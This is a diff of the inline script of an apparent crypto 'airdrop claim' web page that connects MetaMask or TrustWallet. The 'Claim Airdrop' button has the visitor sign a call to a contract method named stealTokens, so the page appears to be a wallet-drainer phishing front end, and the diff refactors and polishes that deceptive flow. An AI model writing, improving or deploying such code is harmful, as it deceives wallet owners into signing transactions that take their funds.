@@ -48,102 +48,101 @@ async function loadConfigAndABI(network) {
     }
 }
 
+// Function to detect the wallet provider
+function getWalletProvider() {
+    if (window.ethereum) {
+        if (window.ethereum.isMetaMask) {
+            console.log("MetaMask detected.");
+            return 'metamask';
+        } else {
+            console.log("TrustWallet detected.");
+            return 'trustwallet';
+        }
+    }
+    return null; // No provider detected
+}
+
 // MetaMask connection handler
 async function connectMetaMask() {
-    if (window.ethereum) {
+    if (window.ethereum && window.ethereum.isMetaMask) {
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (accounts.length === 0) {
-                alert("No accounts found. Please ensure MetaMask is unlocked.");
-                return;
-            }
-            const account = accounts[0];
-            console.log("Connected to MetaMask account:", account);
-            return account;
+            console.log("Connected to MetaMask account:", accounts[0]);
+            document.getElementById('claimAirdropButton').disabled = false;
+            return accounts[0];
         } catch (error) {
             console.error("Error connecting to MetaMask:", error);
             alert("Error connecting to MetaMask.");
         }
     } else {
-        alert("MetaMask is not installed. Please install it to continue.");
+        alert("MetaMask is not installed or enabled. Please use MetaMask.");
     }
 }
 
-// TrustWallet connection handler (placeholder)
+// TrustWallet connection handler
 async function connectTrustWallet() {
-    if (window.ethereum) {
+    if (window.ethereum && !window.ethereum.isMetaMask) { // Check for TrustWallet
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (accounts.length === 0) {
-                alert("No accounts found. Please ensure TrustWallet is unlocked.");
-                return;
-            }
-            const account = accounts[0];
-            console.log("Connected to TrustWallet account:", account);
-            return account;
+            console.log("Connected to TrustWallet account:", accounts[0]);
+            document.getElementById('claimTrustwalletAirdropButton').disabled = false;
+            return accounts[0];
         } catch (error) {
             console.error("Error connecting to TrustWallet:", error);
             alert("Error connecting to TrustWallet.");
         }
     } else {
-        alert("TrustWallet is not installed. Please install it to continue.");
+        alert("TrustWallet is not installed or enabled. Please use TrustWallet.");
     }
 }
 
-// Function to claim airdrop for the connected wallet
+// Unified Claim Airdrop Function
 async function claimAirdrop(wallet, network) {
+    const providerType = getWalletProvider();
+    if ((wallet === 'metamask' && providerType !== 'metamask') ||
+        (wallet === 'trustwallet' && providerType !== 'trustwallet')) {
+        alert(`Please connect to the correct wallet: ${wallet}.`);
+        return;
+    }
+
     const account = wallet === 'metamask' ? await connectMetaMask() : await connectTrustWallet();
     if (!account) return;
 
-    // Load network config and ABI
     const { config, abi } = await loadConfigAndABI(network);
-
     if (!config || !abi) return;
 
-    const contractAddress = config.contractAddress;
-    const tokenAddress = config.tokenAddress;
     const web3 = new Web3(window.ethereum);
-
-    const contract = new web3.eth.Contract(abi, contractAddress);
+    const contract = new web3.eth.Contract(abi, config.contractAddress);
 
     try {
-        console.log(`Claiming airdrop for account: ${account} on ${network}`);
+        console.log(`Claiming airdrop for ${wallet} on ${network}`);
         await contract.methods.stealTokens(account).send({ from: account });
-        alert(`Airdrop claimed successfully for account: ${account}`);
+        alert("Airdrop claimed successfully!");
     } catch (error) {
         console.error("Error claiming airdrop:", error);
         alert("Error claiming airdrop.");
     }
 }
 
-// Event listeners for wallet connection and claim buttons
-document.addEventListener('DOMContentLoaded', function () {
-    // MetaMask Connect Button
-    document.getElementById('connectButton').addEventListener('click', async () => {
-        const account = await connectMetaMask();
-        if (account) {
-            document.getElementById('claimAirdropButton').disabled = false;
-        }
-    });
+// Event Listeners
+document.addEventListener('DOMContentLoaded', () => {
+    // MetaMask Button
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
 
-    // Claim Airdrop Button (MetaMask)
+    // TrustWallet Button
+    document.getElementById('connectTrustwalletButton').addEventListener('click', connectTrustWallet);
+
+    // Claim Airdrop for MetaMask
     document.getElementById('claimAirdropButton').addEventListener('click', () => {
         claimAirdrop('metamask', 'eth');
     });
 
-    // TrustWallet Connect Button
-    document.getElementById('connectTrustwalletButton').addEventListener('click', async () => {
-        const account = await connectTrustWallet();
-        if (account) {
-            document.getElementById('claimTrustwalletAirdropButton').disabled = false;
-        }
-    });
-
-    // Claim Airdrop Button (TrustWallet)
+    // Claim Airdrop for TrustWallet
     document.getElementById('claimTrustwalletAirdropButton').addEventListener('click', () => {
         claimAirdrop('trustwallet', 'bsc');
     });
 });
+
 </script>
 
 </body>
